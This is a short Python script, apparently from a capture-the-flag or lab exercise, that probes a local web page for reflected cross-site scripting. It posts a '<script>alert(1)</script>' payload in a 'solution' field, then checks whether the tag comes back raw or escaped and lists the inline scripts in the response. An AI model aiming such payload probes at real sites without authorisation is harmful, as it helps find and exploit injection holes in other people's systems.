import requests
import re

target_url = "http://127.0.0.1:33031/page"

# Try POST with the correct field name 'solution'
print("POST REQUEST TO /page WITH 'solution' FIELD")
print("=" * 60)

try:
    # Simple script payload
    simple_payload = "<script>alert(1)</script>"
    post_data = {'solution': simple_payload}
    
    post_resp = requests.post(target_url, data=post_data, timeout=10)
    print(f"Status Code: {post_resp.status_code}")
    print(f"Content Length: {len(post_resp.text)} bytes")
    print()
    print("COMPLETE HTML SOURCE:")
    print("-" * 60)
    print(post_resp.text)
    print("-" * 60)
    
    # Check where the payload appears
    if "<script>" in post_resp.text:
        print("\n[+] <script> tag was reflected!")
        # Find the context
        script_idx = post_resp.text.find("<script>")
        surrounding = post_resp.text[max(0, script_idx-100):script_idx+200]
        print(f"Context: ...{surrounding}...")
    else:
        print("\n[-] <script> tag was NOT reflected in raw form")
        # Check for encoded versions
        if "&lt;script&gt;" in post_resp.text:
            print("[+] Found HTML-escaped version: &lt;script&gt;")
    
    # Extract any inline scripts
    post_scripts = re.findall(r'<script[^>]*>(.*?)</script>', post_resp.text, re.DOTALL | re.IGNORECASE)
    print(f"\n[+] Found {len(post_scripts)} inline <script> blocks:")
    for i, script in enumerate(post_scripts):
        print(f"\n--- Script Block {i+1} ---")
        print(script[:2000] if len(script) > 2000 else script)
        
except Exception as e:
    print(f"Error: {e}")

# Now also check static JS files that are referenced
print("\n\n" + "=" * 60)
print("FETCHING STATIC JS FILES")
print("=" * 60)

